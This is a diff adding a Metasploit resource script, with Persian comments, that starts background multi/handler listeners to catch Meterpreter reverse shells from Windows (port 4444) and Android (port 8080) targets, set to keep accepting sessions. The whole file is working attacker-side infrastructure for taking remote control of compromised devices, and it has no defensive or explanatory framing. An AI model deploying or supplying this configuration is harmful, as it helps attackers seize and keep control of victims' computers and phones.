@@ -1,0 +1,17 @@
+# Metasploit Handler Configuration
+# این فایل handler برای دریافت reverse shell ها است
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
+
+# برای Android
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 8080
+set ExitOnSession false
+exploit -j -z
